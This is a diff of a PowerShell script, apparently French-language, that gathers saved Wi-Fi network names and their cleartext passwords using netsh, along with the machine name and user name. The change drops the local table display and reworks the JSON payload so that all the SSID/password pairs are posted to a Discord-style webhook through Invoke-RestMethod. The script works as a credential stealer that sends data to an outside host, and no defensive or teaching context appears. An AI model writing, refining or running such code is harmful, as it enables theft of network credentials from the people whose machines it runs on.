@@ -14,43 +14,29 @@ foreach ($profile in $profiles) {
 
     $results += [PSCustomObject]@{
         SSID       = $profile
-        MotDePasse = $password
+        Password = $password
     }
 }
 
 $machine     = $env:COMPUTERNAME
 $utilisateur = $env:USERNAME
 $date        = Get-Date -Format "yyyy-MM-dd HH:mm"
-# Ajoute ici tes propres variables...
 
-$body = "{
-  `"username`": `"MonScript`",
-  `"embeds`": [{
-    `"title`": `"Nouveau rapport`",
-    `"color`": 3447003,
-    `"fields`": [
-      { `"name`": `"Machine`",     `"value`": `"$machine`",     `"inline`": true },
-      { `"name`": `"Utilisateur`", `"value`": `"$utilisateur`", `"inline`": true },
-      { `"name`": `"Date`",        `"value`": `"$date`",        `"inline`": false },
-      {`"name`": `"Data`",        `"value`": `"$results`",        `"inline`": false },
-    ]
-  }]
-}"
+$lignes = $results | ForEach-Object { "- $($_.SSID) : $($_.Password)" }
+$texte  = $lignes -join "`n"
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+$payload = [ordered]@{
+    embeds   = @(@{
+        title  = "Nouvelle entrée"
+        fields = @(
+            @{ name = "Machine";     value = $machine;     inline = $true  }
+            @{ name = "Utilisateur"; value = $utilisateur; inline = $true  }
+            @{ name = "Date";        value = $date;        inline = $false }
+            @{ name = "SSID / Password";        value = $texte;       inline = $false }
+        )
+    })
+}
 
-# Lister tous les profils Wi-Fi et leurs mots de passe
-$profiles = netsh wlan show profiles |
-    Where-Object { $_ -match "Profil Tous les utilisateurs\s*:\s*(.+)" } |
-    ForEach-Object { ($_ -split ":\s*", 2)[1].Trim() }
+$body = $payload | ConvertTo-Json -Depth 5 -Compress
 
-foreach ($profile in $profiles) {
-    $details = netsh wlan show profile name="$profile" key=clear
-    $passwordLine = $details | Where-Object { $_ -match "Contenu de la clé\s*:" }
-    $password = if ($passwordLine) { ($passwordLine -split ":\s*", 2)[1].Trim() } else { "(aucun)" }
-
-    [PSCustomObject]@{
-        SSID       = $profile
-        MotDePasse = $password
-    }
-} | Format-Table -AutoSize
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json; charset=utf-8"
